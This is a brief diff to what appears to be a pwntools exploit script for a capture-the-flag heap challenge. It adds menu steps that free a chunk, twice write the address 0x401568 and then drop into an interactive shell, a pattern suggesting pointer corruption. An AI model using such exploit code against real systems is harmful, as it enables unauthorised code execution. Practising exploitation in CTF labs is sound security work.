@@ -74,9 +74,18 @@ def info_addr(tag, addr): return p.info(tag + ': {:#x}'.format(addr))
 
 
 # info
+ru('free\n')
+sl('3')
 
+ru('free\n')
+sl('2')
+se(p64(0x00401568))
+ru('free\n')
+sl('2')
+se(p64(0x00401568))
+ru('free\n')
+sl('1')
 p.interactive()
-
 # rop1s
 
 
